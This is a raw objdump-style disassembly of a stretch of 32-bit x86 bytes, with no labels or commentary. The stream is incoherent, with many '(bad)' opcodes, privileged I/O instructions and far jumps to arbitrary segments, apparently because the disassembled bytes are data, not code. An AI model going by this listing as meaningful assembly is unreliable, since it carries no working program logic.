  417ef6:	inc    edx
  417ef7:	inc    ebp
  417ef8:	mov    ss,WORD PTR [ebp+0x37]
  417efb:	inc    edx
  417efc:	cmp    bl,BYTE PTR [esi+0x37]
  417eff:	imul   esp,DWORD PTR [ebp+0x74],0xffffffa8
  417f03:	das    
  417f04:	aaa    
  417f05:	cs call 0xf195ca17
  417f0b:	pop    es
  417f0c:	dec    eax
  417f0d:	jle    0x417ebd
  417f0f:	inc    edi
  417f10:	stos   BYTE PTR es:[edi],al
  417f11:	in     eax,0x79
  417f13:	pop    ds
  417f14:	pushf  
  417f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f16:	xchg   BYTE PTR [ebp+ebp*1-0x1d],ch
  417f1a:	mov    ds:0xa1f2a261,eax
  417f1f:	cmp    ebx,DWORD PTR [ebp-0x48]
  417f22:	dec    eax
  417f23:	icebp  
  417f24:	jmp    0x60957fb5
  417f29:	inc    eax
  417f2a:	gs xor edi,edx
  417f2d:	xor    esp,edi
  417f2f:	push   es
  417f30:	jae    0x417ecf
  417f32:	ja     0x417f4d
  417f34:	push   esi
  417f35:	js     0x417ece
  417f37:	test   ebx,eax
  417f39:	mov    ecx,0x76b69862
  417f3e:	loopne 0x417f3e
  417f40:	mov    edx,0x5de3960
  417f45:	and    al,0xcd
  417f47:	(bad)  
  417f48:	jecxz  0x417ef9
  417f4a:	add    ch,bl
  417f4c:	jns    0x417fba
  417f4e:	mov    ah,0x81
  417f50:	push   ss
  417f51:	xchg   esi,eax
  417f52:	loopne 0x417f01
  417f54:	xor    al,0x7b
  417f57:	jge    0x417f74
  417f59:	push   ecx
  417f5a:	jns    0x417f6b
  417f5c:	sub    eax,0xce966268
  417f61:	jo     0x417fd4
  417f63:	ins    BYTE PTR es:[edi],dx
  417f64:	scas   al,BYTE PTR es:[edi]
  417f65:	cmp    eax,0x574ed21c
  417f6a:	sbb    DWORD PTR [edi+0x4be8679d],ebp
  417f70:	nop
  417f71:	adc    cl,ah
  417f73:	xor    BYTE PTR [esi+0x5c],ah
  417f76:	sub    dl,BYTE PTR [edi-0x5e]
  417f79:	and    al,0x70
  417f7b:	pop    ebp
  417f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f7d:	(bad)  
  417f7f:	cmp    eax,ecx
  417f81:	adc    ebp,DWORD PTR [ecx+0x5d9aec5]
  417f87:	adc    dh,bl
  417f89:	mov    cl,BYTE PTR [edx+0x2a06d823]
  417f8f:	adc    al,0xf
  417f91:	add    al,0x1f
  417f93:	call   0x81d4:0xd18adab0
  417f9a:	jns    0x417f41
  417f9c:	fwait
  417f9d:	push   ss
  417f9e:	out    dx,eax
  417f9f:	in     al,dx
  417fa0:	lock jge 0x417fdd
  417fa3:	sub    al,0xdf
  417fa5:	push   es
  417fa6:	arpl   WORD PTR [esi],di
  417fa8:	(bad)
  417fad:	cs mov dl,0x4b
  417fb0:	and    edi,DWORD PTR [ebx+0x59101d35]
  417fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb7:	lods   al,BYTE PTR ds:[esi]
  417fb8:	stos   BYTE PTR es:[edi],al
  417fb9:	mov    ecx,0xad29f8f
  417fbe:	mov    esi,0x6e5267b4
  417fc3:	add    eax,0x7da02f12
  417fc8:	sub    ah,BYTE PTR ds:0xa0284330
  417fce:	or     ecx,esp
  417fd0:	pop    esi
  417fd1:	xchg   esp,eax
  417fd2:	adc    eax,0x69420489
  417fd7:	out    dx,eax
  417fd8:	inc    esi
  417fd9:	pop    ss
  417fda:	push   0x86cdad4a
  417fdf:	outs   dx,DWORD PTR ds:[esi]
  417fe0:	inc    ebp
  417fe1:	cmp    cl,BYTE PTR [eax+edx*2+0x64]
  417fe5:	pop    eax
  417fe6:	ins    DWORD PTR es:[edi],dx
  417fe7:	ins    DWORD PTR es:[edi],dx
  417fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fe9:	mov    DWORD PTR [edi-0x4dd55ae5],0xbb08fccb
  417ff3:	fadd   DWORD PTR [edx-0x2cfc4759]
  417ff9:	mov    ch,0x4a
  417ffb:	xor    eax,DWORD PTR [ecx]
  417ffd:	and    cl,BYTE PTR fs:[eax+0x7]
  418001:	sbb    eax,0x915b4e14
  418006:	push   ds
  418007:	mov    al,0x49
  418009:	rol    dh,0x96
  41800c:	fidiv  DWORD PTR [ebx+0x2b1c0812]
  418012:	mov    esp,0x2bd3cd46
  418017:	or     cl,BYTE PTR [eax+ecx*4-0x71]
  41801b:	mov    dh,0xde
  41801d:	fcomp  st(3)
  41801f:	je     0x417fa1
  418021:	xor    dl,BYTE PTR [ebp-0x18]
  418024:	add    BYTE PTR [esp+ebx*8-0x572e3341],ch
  41802b:	or     al,ch
  41802d:	push   ds
  41802e:	ins    DWORD PTR es:[edi],dx
  41802f:	cld    
  418030:	adc    al,0xd1
  418032:	xor    DWORD PTR [eax-0x61351565],edi
  418038:	mov    al,ds:0x6d5c99b2
  41803d:	(bad)  
  41803e:	mov    ebp,esp
  418040:	and    ebp,DWORD PTR [esi]
  418042:	inc    edi
  418043:	stos   DWORD PTR es:[edi],eax
  418044:	shr    al,1
  418046:	fnsave [esi+0x72]
  418049:	mov    ebp,DWORD PTR [ebx]
  41804b:	je     0x418012
  41804d:	fs adc dh,0xe5
  418051:	(bad)  
  418053:	push   ebx
  418054:	ja     0x417fe0
  418056:	push   edi
  418057:	lock mov ah,0x36
  41805a:	test   DWORD PTR [eax-0x26],esp
  41805d:	push   ebx
  41805e:	push   0x65
  418060:	idiv   BYTE PTR [esi+ecx*8+0x14b6d95b]
  418067:	inc    edx
  418068:	xchg   ebp,eax
  418069:	std    
  41806a:	mov    bl,0xe6
  41806c:	cmp    eax,0x5b159702
  418071:	into   
  418072:	leave  
  418073:	mov    DWORD PTR [ecx-0x6aab6179],edx
  418079:	test   BYTE PTR [esi+edx*2-0x57],cl
  41807d:	add    BYTE PTR [esi],bl
  41807f:	mov    ds:0x22cb269a,al
  418084:	push   cs
  418085:	repz mov eax,0x25d14395
  41808b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41808c:	add    eax,DWORD PTR [ebp-0x15fda515]
  418092:	clc    
  418093:	(bad)  
  418094:	ficom  WORD PTR ds:0x6b623f68
  41809a:	mov    dl,0x43
  41809c:	icebp  
  41809d:	xor    ah,BYTE PTR [ebx+0x69]
  4180a0:	das    
  4180a1:	scas   al,BYTE PTR es:[edi]
  4180a2:	pop    es
  4180a3:	lds    esi,FWORD PTR [eax-0x592d01cb]
  4180a9:	rcr    BYTE PTR [ebp-0x76e592df],0xb0
  4180b0:	jmp    0xfb75:0xb80ab5aa
  4180b7:	add    BYTE PTR [ebx],bh
  4180b9:	(bad)  
  4180ba:	cmp    DWORD PTR [edx-0x5b61ce2d],edi
  4180c0:	mov    dh,0x60
  4180c2:	cmp    eax,0x2ee557b9
  4180c7:	gs xchg ebp,eax
  4180c9:	jns    0x41806c
  4180cb:	mov    gs,WORD PTR [edi+0x35]
  4180ce:	(bad)  
  4180cf:	shr    DWORD PTR [ebx+0x1bcd2c55],0x3d
  4180d6:	mov    ch,0x69
  4180d8:	in     al,dx
  4180d9:	xor    cl,bl
  4180db:	mov    esi,?
  4180dd:	sub    esi,DWORD PTR [eax+0x5b53d5ff]
  4180e3:	sahf   
  4180e4:	icebp  
  4180e5:	add    dh,bl
  4180e7:	pop    eax
  4180e8:	pop    ecx
  4180e9:	mov    bh,0x52
  4180eb:	xor    esp,DWORD PTR [eax+0x75]
  4180ee:	sbb    al,BYTE PTR [edx-0x4]
  4180f1:	out    dx,eax
  4180f2:	push   ss
  4180f3:	aam    0xf6
  4180f5:	stos   BYTE PTR es:[edi],al
  4180f6:	nop
  4180f7:	cs pop ss
  4180f9:	jle    0x4180bc
  4180fb:	aam    0xf9
  4180fd:	out    0x48,al
  4180ff:	loope  0x4180d5
  418101:	mov    esi,?
  418103:	add    DWORD PTR [edi],ecx
  418105:	popa   
  418106:	jle    0x4180c7
  418108:	or     al,0xac
  41810a:	mov    cl,0xd9
  41810c:	std    
  41810d:	(bad)  
  41810e:	sbb    DWORD PTR [edi-0x26],ebp
  418111:	mov    bh,0x98
  418113:	aaa    
  418114:	addr16 push es
  418116:	cli    
  418117:	cmp    DWORD PTR [ebx+0x2f],esi
  41811a:	mov    bh,0x42
  41811c:	mov    bl,0x66
  41811e:	enter  0x3d9b,0x65
  418122:	es iret 
  418124:	lahf   
  418125:	add    DWORD PTR [eax],edi
  418127:	mov    esi,0x8b8db415
  41812c:	js     0x41817f
  41812e:	in     al,0xd4
  418130:	mov    eax,ds:0x8ab60361
  418135:	and    edi,DWORD PTR [esi-0x43319c9]
  41813b:	jecxz  0x4180d7
  41813d:	mov    al,0x94
  41813f:	xor    DWORD PTR [edi-0x12],0x50
  418143:	les    eax,FWORD PTR [esi+0x10]
  418146:	pop    ds
  418147:	(bad)  
  418148:	(bad)  
  418149:	aad    0x30
  41814b:	(bad)  
  41814d:	loopne 0x418134
  41814f:	fnsave ds:0x210a4ce0
  418155:	dec    ecx
  418156:	push   edi
  418157:	sahf   
  418158:	push   0xffffffc4
  41815a:	xchg   BYTE PTR [ebx-0x2ec56708],bl
  418160:	ins    DWORD PTR es:[edi],dx
  418161:	pop    ebx
  418162:	ds into 
  418164:	stos   BYTE PTR es:[edi],al
  418165:	push   es
  418166:	add    eax,0xb9323298
  41816b:	cmp    DWORD PTR [ebp-0x50],0x123a4544
  418172:	add    edi,esi
  418174:	fdiv   st(4),st
  418176:	push   0xffffffa3
  418178:	or     eax,0x82c3e554
  41817d:	adc    bh,al
  41817f:	push   ebx
  418180:	xchg   esi,eax
  418181:	out    dx,eax
  418182:	cmp    BYTE PTR [ebp+ecx*2-0x61d2c59],0x7a
  41818a:	shr    BYTE PTR [edi+0x313aebaf],cl
  418190:	fsub   DWORD PTR [ebp-0x29]
  418193:	int    0x76
  418195:	in     eax,0xb3
  418197:	push   edi
  418198:	or     DWORD PTR [edi+0x20ef3aff],esp
  41819e:	jnp    0x418140
  4181a0:	pop    ebx
  4181a1:	mov    eax,ds:0x3313c6aa
  4181a6:	fsubr  st(7),st
  4181a8:	fiadd  DWORD PTR [ebx+edi*2-0x348b73f7]
  4181af:	sbb    al,0x75
  4181b1:	or     eax,0xe11f9702
  4181b6:	or     edx,DWORD PTR [edi-0x458117c1]
  4181bc:	aad    0xb8
  4181be:	stos   BYTE PTR es:[edi],al
  4181bf:	ds dec ebx
  4181c1:	das    
  4181c2:	adc    ebp,DWORD PTR [ecx-0x5e]
  4181c5:	or     DWORD PTR [edx],edi
  4181c7:	or     dl,BYTE PTR [edi-0x71]
  4181ca:	in     eax,0x37
  4181cc:	loopne 0x418158
  4181ce:	fcom   QWORD PTR [ebx+0x3c1d4a95]
  4181d4:	or     edi,esi
  4181d6:	adc    al,0x14
  4181d8:	push   ebp
  4181d9:	rol    DWORD PTR [esi+0x66],1
  4181dc:	cmp    BYTE PTR [esi-0x486928ed],al
  4181e2:	and    esi,DWORD PTR [edx-0x54]
  4181e5:	call   0x48f1:0x77d0fda8
  4181ec:	sbb    eax,0x6fa8967c
  4181f1:	loop   0x418263
  4181f3:	inc    ecx
  4181f4:	jb     0x418204
  4181f6:	mov    ecx,0x715a1c40
  4181fb:	adc    DWORD PTR [esi-0x39],edi
  4181fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181ff:	mov    bl,0x5
  418201:	pop    ecx
  418202:	cmp    eax,0xd717b560
  418207:	ret    0xbc80
  41820a:	aas    
  41820b:	jne    0x418248
  41820d:	outs   dx,DWORD PTR ds:[esi]
  41820e:	pop    eax
  41820f:	pop    ebx
  418210:	ror    BYTE PTR [edx],1
  418212:	inc    ecx
  418213:	xor    eax,0x8423bf52
  418218:	xchg   DWORD PTR [edx],esp
  41821a:	adc    ah,dh
  41821c:	mov    al,ds:0x90694b6c
  418221:	arpl   WORD PTR ds:0x9787d2a8,di
  418227:	dec    esp
  418228:	or     edx,DWORD PTR ds:0x4e92
  41822d:	adc    eax,0xb037ec3f
  418232:	sti    
  418233:	je     0x4181cf
  418235:	out    dx,eax
  418236:	inc    esp
  418238:	pushf  
  418239:	xor    cl,ah
  41823b:	push   edx
  41823c:	iret   
  41823d:	daa    
  41823e:	rcr    BYTE PTR fs:[edi-0x75],cl
  418242:	lea    ebp,[eax]
  418244:	bound  edx,QWORD PTR [edi+esi*1+0x23]
  418248:	add    DWORD PTR [esi-0x6a],ebp
  41824b:	pop    ds
  41824c:	sbb    al,0xdd
  41824e:	push   eax
  41824f:	xchg   ebx,eax
  418250:	dec    esi
  418251:	pop    esi
  418252:	sbb    edx,DWORD PTR cs:[bx]
  418256:	or     DWORD PTR [ebx],0xdb94b38
  41825c:	sahf   
  41825d:	rcl    BYTE PTR [edi],1
  41825f:	xchg   ebp,eax
  418260:	add    DWORD PTR [esi+0x3a9d0ff3],0xf8ad7309
  41826a:	nop
  41826b:	int    0xe5
  41826d:	push   ebp
  41826e:	cmp    dh,BYTE PTR [edi]
  418270:	jns    0x418245
  418272:	mov    dh,0x7
  418274:	xor    esp,DWORD PTR [edx+ecx*2-0x407736b6]
  41827b:	mov    bl,BYTE PTR [eax]
  41827d:	mov    DWORD PTR ds:0xcf5b8438,edi
  418283:	das    
  418284:	jo     0x418284
  418286:	mov    al,BYTE PTR [esp+ebx*8+0x70bb3cfc]
  41828d:	int    0xbc
  41828f:	call   FWORD PTR [ebp+0x1f910ee6]
  418295:	sub    eax,0x7ae47064
  41829a:	jne    0x418287
  41829c:	ficomp DWORD PTR [eax+0x7f9ff225]
  4182a2:	out    dx,al
  4182a3:	sahf   
  4182a4:	ja     0x4182d6
  4182a6:	and    ebp,DWORD PTR ds:0x31da2411
  4182ac:	pushf  
  4182ad:	stc    
  4182ae:	fchs   
  4182b0:	(bad)  
  4182b1:	mov    cl,0xac
  4182b3:	push   esi
  4182b4:	mov    dl,0x58
  4182b6:	mov    al,ds:0xe2c934d5
  4182bb:	cmp    al,0x0
  4182bd:	cmc    
  4182be:	add    BYTE PTR [eax],dl
  4182c0:	inc    ebp
  4182c1:	pop    edi
  4182c2:	or     eax,0x7e952cf8
  4182c7:	das    
  4182c8:	and    esi,eax
  4182ca:	scas   al,BYTE PTR es:[edi]
  4182cb:	push   eax
  4182cc:	push   ebx
  4182cd:	inc    ecx
  4182ce:	mov    eax,0x2ff59dd4
  4182d3:	pop    ds
  4182d4:	lds    ebx,FWORD PTR [edi-0x7b]
  4182d7:	adc    bl,BYTE PTR [eax+0x1dda5eaf]
  4182dd:	inc    esi
  4182de:	sub    al,0x94
  4182e0:	adc    al,0xaa
  4182e2:	pop    ebp
  4182e3:	and    ebx,ebp
  4182e5:	lds    eax,FWORD PTR [esi]
  4182e7:	popa   
  4182e8:	and    BYTE PTR [esi+0x7caa340a],al
  4182ee:	js     0x41832c
  4182f0:	mov    DWORD PTR [ebx+ebp*1-0x60],ecx
  4182f4:	pop    ebp
  4182f5:	jle    0x4182c9
  4182f7:	cmp    edi,edx
  4182f9:	call   0x1a44edeb
  4182fe:	and    BYTE PTR [ebp-0x36],0xa5
  418302:	jecxz  0x4182a5
  418304:	aad    0xfa
  418306:	xchg   edx,eax
  418307:	dec    edi
  418308:	dec    edi
  418309:	xor    al,0xbf
  41830b:	or     ah,BYTE PTR [edx+0x7c8de7f7]
  418311:	fisttp QWORD PTR [eax]
  418313:	sbb    BYTE PTR [edx+0x4028e1fc],bh
  418319:	mov    ds:0xb3b61b4d,al
  41831e:	(bad)  
  41831f:	es repnz inc esi
  418322:	mov    al,ds:0x613a154e
  418327:	or     esp,DWORD PTR [ecx+0x2ed77530]
  41832d:	outs   dx,DWORD PTR ds:[esi]
  41832e:	dec    ecx
  41832f:	fwait
  418330:	cmp    edx,esp
  418332:	or     eax,0xd885c711
  418337:	outs   dx,DWORD PTR ds:[esi]
  418338:	loopne 0x4183a2
  41833a:	ror    BYTE PTR [ebx-0x57],cl
  41833d:	arpl   WORD PTR [esi],bp
  41833f:	fistp  QWORD PTR [edi]
  418341:	lahf   
  418342:	sti    
  418343:	fnstcw WORD PTR [edx]
  418345:	das    
  418346:	rol    BYTE PTR [esp+eiz*4+0x465abacf],1
  41834d:	jb     0x418315
  41834f:	xchg   edi,eax
  418350:	mov    ecx,0xffbba5a7
  418355:	sbb    BYTE PTR [ecx+0x5f],bl
  418358:	(bad)  
  418359:	dec    esi
  41835a:	xlat   BYTE PTR ds:[ebx]
  41835b:	rcl    DWORD PTR [ebp+0x6e],cl
  41835e:	fidiv  WORD PTR [ebx]
  418360:	pop    ebp
  418361:	fidivr WORD PTR [esi+0x7916e05c]
  418367:	out    0xad,eax
  418369:	ss sub al,0x5e
  41836c:	shl    al,cl
  41836e:	jns    0x4183a5
  418370:	arpl   WORD PTR [edx+0x2e],cx
  418373:	loope  0x418368
  418375:	add    al,0xab
  418377:	data16 and BYTE PTR [edi+0x7f],0xad
  41837c:	cdq    
  41837d:	mov    dh,0xc2
  41837f:	stos   DWORD PTR es:[edi],eax
  418380:	scas   al,BYTE PTR es:[edi]
  418381:	fistp  DWORD PTR [ebx]
  418383:	and    BYTE PTR [esi+0x2c53baa2],bl
  418389:	mov    esi,0x289193f
  41838e:	pop    eax
  41838f:	jb     0x41839b
  418391:	sbb    eax,0xdd6343f3
  418396:	das    
  418397:	adc    eax,0xa8256471
  41839c:	enter  0xf900,0x1f
  4183a0:	xchg   edx,eax
  4183a1:	imul   ebp,esp,0x1f196d7d
  4183a7:	mov    ds:0xb2135c7f,al
  4183ac:	xchg   edx,eax
  4183ad:	xor    dh,BYTE PTR [edx-0x52]
  4183b0:	repz xor esi,DWORD PTR [ecx]
  4183b3:	dec    edi
  4183b4:	add    DWORD PTR [edi],esi
  4183b6:	mov    BYTE PTR [ecx+eax*1+0x62],dl
  4183ba:	mov    cl,BYTE PTR [ecx-0x4d]
  4183bd:	fwait
  4183be:	add    eax,0x29ae1fe0
  4183c3:	xchg   BYTE PTR [ebp-0x38],dl
  4183c6:	clc    
  4183c7:	or     cl,BYTE PTR [eax-0x10]
  4183ca:	mov    bh,0xe8
  4183cc:	sbb    al,BYTE PTR [ebx]
  4183ce:	or     cl,bh
  4183d0:	mov    al,0xc6
  4183d2:	pop    eax
  4183d3:	xchg   ebx,eax
  4183d4:	imul   ebx,ebx,0xffd3271d
  4183da:	pushf  
  4183db:	call   0x386baba7
  4183e0:	aad    0x78
  4183e2:	pop    eax
  4183e3:	aaa    
  4183e4:	push   esp
  4183e5:	mov    edi,DWORD PTR [edx+0x48910d4]
  4183eb:	data16 jmp 0x4183f7
  4183ee:	add    eax,DWORD PTR [edx]
  4183f0:	sbb    BYTE PTR [edx],bl
  4183f2:	pop    esi
  4183f3:	pop    ebp
  4183f4:	rcl    BYTE PTR [eax+0x4b],1
  4183f7:	ret    
  4183f8:	push   esi
  4183f9:	pop    es
  4183fa:	cli    
  4183fb:	add    esi,ecx
  4183fd:	or     esi,ebp
  4183ff:	pop    eax
  418400:	fstp   QWORD PTR [ebp-0x904ffa]
  418406:	sub    eax,0x520d0107
  41840b:	adc    BYTE PTR [esi+0x70],al
  41840e:	add    bl,BYTE PTR [ebp+0x0]
  418411:	push   edx
  418412:	outs   dx,DWORD PTR ds:[esi]
  418413:	aad    0x9d
  418415:	mov    esi,0xc6eb41
  41841a:	pmaxsw mm7,QWORD PTR [ecx-0x643d8d05]
  418421:	das    
  418422:	xchg   DWORD PTR [edi],ecx
  418424:	clc    
  418425:	mov    al,0x76
  418427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418428:	or     esi,DWORD PTR [esi+0x43201a84]
  41842e:	rcl    DWORD PTR [esi-0x7e],cl
  418431:	jmp    0x418462
  418433:	xor    DWORD PTR [esi-0x6ee6f22d],edi
  418439:	add    BYTE PTR [ecx-0x4e],dl
  41843c:	ja     0x41846d
  41843e:	add    ch,BYTE PTR [ecx-0x5a853d9c]
  418444:	xchg   ecx,eax
  418445:	(bad)  
  418446:	fsub   st,st(4)
  418448:	(bad)  [edi-0x7b]
  41844b:	sbb    DWORD PTR [edi+0x14],edx
  41844e:	mov    ds:0x8adc76fa,eax
  418453:	inc    ecx
  418454:	sbb    bl,dh
  418456:	(bad)  
  418458:	dec    ebx
  418459:	pop    ds
  41845a:	je     0x41848c
  41845c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41845d:	lds    edx,FWORD PTR [esi+ebp*1-0x767763c7]
  418464:	(bad)  
  418465:	pop    ebx
  418466:	popf   
  418467:	aam    0x8c
  418469:	leave  
  41846a:	nop
  41846b:	test   BYTE PTR [esi+0x36],dh
  41846e:	cmp    BYTE PTR ds:0x7abccba5,dl
  418474:	mov    esp,0x147fd6ea
  418479:	mov    ah,0xe6
  41847b:	das    
  41847c:	adc    al,0x7c
  41847e:	icebp  
  41847f:	pop    ebp
  418480:	ins    DWORD PTR es:[edi],dx
  418481:	in     al,0x51
  418483:	pop    edi
  418484:	xor    al,0xb1
  418486:	add    edi,DWORD PTR [ecx]
  418488:	leave  
  418489:	xor    DWORD PTR [edi],edx
  41848b:	mov    dl,0x68
  41848d:	shr    BYTE PTR [ebx],1
  41848f:	icebp  
  418490:	aas    
  418491:	scas   eax,DWORD PTR es:[edi]
  418492:	imul   edx,DWORD PTR [esi-0x4598f378],0x1e520da4
  41849c:	sub    BYTE PTR [ebx],bl
  41849e:	cwde   
  41849f:	daa    
  4184a0:	ins    DWORD PTR es:[edi],dx
  4184a1:	jne    0x4184cd
  4184a3:	xchg   ebx,esp
  4184a5:	or     dl,BYTE PTR [edx+0x4731733b]
  4184ab:	mov    ah,0x50
  4184ad:	xchg   esp,eax
  4184ae:	into   
  4184af:	pop    ds
  4184b0:	xor    ebx,DWORD PTR [edx+0x2d63dfb]
  4184b6:	and    BYTE PTR [ecx-0x8],ah
  4184b9:	jne    0x418508
  4184bb:	ds jns 0x4184af
  4184be:	push   ebx
  4184bf:	mov    bh,0x71
  4184c1:	outs   dx,DWORD PTR ds:[esi]
  4184c2:	std    
  4184c3:	sbb    ah,al
  4184c5:	adc    DWORD PTR [esi+0x34],ebx
  4184c8:	shl    BYTE PTR [eax+0x69f7aba5],1
  4184ce:	push   esp
  4184cf:	sbb    al,BYTE PTR [ecx]
  4184d1:	cmp    edi,DWORD PTR [ebp-0x67]
  4184d4:	dec    ebx
  4184d5:	fwait
  4184d6:	nop
  4184d7:	int    0x64
  4184d9:	mov    ds:0x726b4731,al
  4184de:	and    BYTE PTR [edi],ch
  4184e0:	jbe    0x418465
  4184e2:	xchg   BYTE PTR [edi+0x642460e6],ah
  4184e8:	fsubr  st(3),st
  4184ea:	xchg   ebp,eax
  4184eb:	daa    
  4184ec:	dec    eax
  4184ed:	aad    0x7f
  4184ef:	inc    edx
  4184f0:	dec    ebp
  4184f1:	enter  0x887d,0x3d
  4184f5:	jnp    0x41850d
  4184f7:	adc    al,0x7a
  4184f9:	mov    BYTE PTR [edx],dh
  4184fb:	mov    ebx,0x4bf36de9
  418500:	lds    eax,FWORD PTR [eax]
  418502:	jns    0x4184de
  418504:	daa    
  418505:	hlt    
  418506:	mov    ?,WORD PTR [esi-0x239c2111]
  41850c:	sbb    al,0x74
  41850e:	cli    
  41850f:	push   ss
  418510:	inc    ecx
  418511:	inc    esi
  418512:	ins    DWORD PTR es:[edi],dx
  418513:	fs iret 
  418515:	aad    0x7e
  418517:	std    
  418518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418519:	adc    ch,dl
  41851b:	or     cl,al
  41851d:	jl     0x418580
  41851f:	or     ebx,DWORD PTR [edi+ebp*4+0x71174014]
  418526:	lods   eax,DWORD PTR ds:[esi]
  418527:	das    
  418528:	out    0x5e,al
  41852a:	and    DWORD PTR [eax],eax
  41852c:	lods   al,BYTE PTR ds:[esi]
  41852d:	iret   
  41852e:	or     eax,0xdf95a8b8
  418533:	jne    0x418568
  418535:	test   bh,ch
  418537:	je     0x41858b
  418539:	lea    edx,ds:0x6580a347
  41853f:	jb     0x41853b
  418541:	add    eax,0x9cd95ed0
  418546:	test   eax,0x378cd3ca
  41854b:	adc    eax,0xce9605c7
  418550:	rcr    BYTE PTR [eax-0x73],cl
  418553:	add    ebx,ebp
  418555:	call   0x6ba7:0x61cd31d1
  41855c:	sti    
  41855d:	push   esp
  41855e:	cli    
  41855f:	retf   0xf65
  418562:	and    esp,edi
  418564:	sahf   
  418565:	shl    ch,1
  418567:	lods   al,BYTE PTR ds:[esi]
  418568:	cs stos BYTE PTR es:[edi],al
  41856a:	daa    
  41856b:	fimul  WORD PTR [ebp+0x108ae734]
  418571:	xchg   BYTE PTR [eax+0x65f9b774],bh
  418577:	test   al,0x97
  418579:	cdq    
  41857a:	fwait
  41857b:	push   esp
  41857c:	or     eax,0x93c4d289
  418581:	call   0xaf40:0xc307bfe8
  418588:	mov    BYTE PTR [edx],ah
  41858a:	jae    0x41855b
  41858c:	cmp    DWORD PTR [edi],esi
  41858e:	mov    ebp,DWORD PTR cs:[ebx-0x7e2c529a]
  418595:	xchg   esp,eax
  418596:	inc    esp
  418597:	xor    al,0xba
  418599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41859a:	sbb    esi,0xffffff87
  41859d:	test   BYTE PTR [ebx+0x2cb50466],bh
  4185a3:	mov    ds:0x40d3434b,eax
  4185a8:	push   esp
  4185a9:	(bad)
  4185ac:	pushf  
  4185ad:	dec    eax
  4185ae:	push   ds
  4185af:	push   ebx
  4185b0:	shl    ebx,0xf7
  4185b3:	(bad)  
  4185b4:	mov    ds:0xc24d099b,eax
  4185b9:	aam    0xd5
  4185bb:	xchg   ebx,eax
  4185bc:	and    al,0x88
  4185be:	push   ss
  4185bf:	xor    DWORD PTR [ecx+0x1e],0x70
  4185c3:	adc    eax,esi
  4185c5:	mov    dl,BYTE PTR [edx]
  4185c7:	fimul  WORD PTR [ebp-0x111f4c26]
  4185cd:	inc    ecx
  4185ce:	xchg   DWORD PTR [ebp+edx*2-0xf1cdd7a],esp
  4185d5:	pop    es
  4185d6:	nop
  4185d7:	adc    ebp,DWORD PTR [eax+0x44]
  4185da:	rcr    BYTE PTR ds:0xb584ed2a,cl
  4185e0:	adc    eax,0x60984f21
  4185e5:	mov    cl,0x62
  4185e7:	call   0xc5cc:0x25849e0d
  4185ee:	ret    0x8115
  4185f1:	dec    esi
  4185f2:	icebp  
  4185f3:	mov    dl,0x87
  4185f5:	jge    0x41863f
  4185f7:	mov    ch,0xfb
  4185f9:	jle    0x41859f
  4185fb:	sbb    eax,0x5e92b426
  418600:	sbb    DWORD PTR ds:0xcf7a799d,edi
  418606:	mov    gs,WORD PTR [edi]
  418608:	mov    ?,edi
  41860a:	fiadd  WORD PTR [edi]
  41860c:	jo     0x4185e2
  41860e:	clc    
  41860f:	lods   eax,DWORD PTR ds:[esi]
  418610:	dec    ebp
  418611:	fdivr  QWORD PTR [eax+0x14]
  418614:	adc    eax,edi
  418616:	sbb    bh,0xe3
  418619:	bound  esi,QWORD PTR [edi]
  41861b:	cdq    
  41861c:	loope  0x41860a
  41861e:	(bad)  
  41861f:	lds    eax,FWORD PTR [eax]
  418621:	mov    BYTE PTR [ebx+ecx*4],al
  418624:	push   cs
  418625:	push   ds
  418626:	mov    dh,0xc1
  418628:	scas   eax,DWORD PTR es:[edi]
  418629:	add    edx,esp
  41862b:	rol    BYTE PTR [ecx-0x74],0xc5
  41862f:	cdq    
  418630:	stc    
  418631:	cmp    al,0x78
  418633:	sahf   
  418634:	gs int3 
  418636:	int    0x9c
  418638:	push   ecx
  418639:	mov    ch,BYTE PTR [eax-0x29]
  41863c:	addr16 dec eax
  41863e:	push   edi
  41863f:	push   ecx
  418640:	test   DWORD PTR [esi],esi
  418642:	loop   0x41867c
  418644:	mov    esi,0xe576db82
  418649:	call   0x11d8:0x47c398d0
  418650:	mov    eax,0xa1307556
  418655:	adc    al,0x92
  418657:	adc    eax,0xe9f0f3c6
  41865c:	add    BYTE PTR [edx],bl
  41865e:	xlat   BYTE PTR ds:[ebx]
  41865f:	loop   0x4186b3
  418661:	jae    0x418680
  418663:	cdq    
  418664:	xchg   ecx,eax
  418665:	sbb    al,0xaa
  418667:	pop    ds
  418668:	nop
  418669:	sub    al,0xf8
  41866b:	loopne 0x418694
  41866d:	aam    0xe9
  41866f:	int3   
  418670:	xchg   edx,eax
  418671:	out    dx,al
  418672:	sbb    al,0xf1
  418674:	into   
  418675:	jmp    0x5ac3:0x878e2f89
  41867c:	mov    ecx,0xf789b1be
  418681:	adc    dh,dh
  418683:	mov    edx,0x4d6b3a43
  418688:	test   BYTE PTR [ebx],ah
  41868a:	sub    dh,ah
  41868c:	(bad)  [eax+eax*1+0x6dcdb242]
  418693:	and    ah,BYTE PTR ds:0x240b0135
  418699:	into   
  41869a:	mov    WORD PTR [esp+ebx*2-0xbe5332e],ss
  4186a1:	xchg   BYTE PTR [eax],bl
  4186a3:	out    0x50,al
  4186a5:	ss pop ebp
  4186a7:	mov    esi,0x5438fe35
  4186ac:	jbe    0x418646
  4186ae:	outs   dx,BYTE PTR ds:[esi]
  4186af:	pushw  0xffbe
  4186b2:	sbb    edx,edx
  4186b4:	xchg   ecx,eax
  4186b5:	mov    bh,0x7d
  4186b7:	push   esi
  4186b8:	sahf   
  4186b9:	xchg   edx,eax
  4186ba:	mov    BYTE PTR [ebp+0x20],cl
  4186bd:	loop   0x41871c
  4186bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c0:	pop    ecx
  4186c1:	lods   eax,DWORD PTR ds:[esi]
  4186c2:	push   edx
  4186c3:	ret    0x92c4
  4186c6:	adc    al,0x55
  4186c8:	in     eax,dx
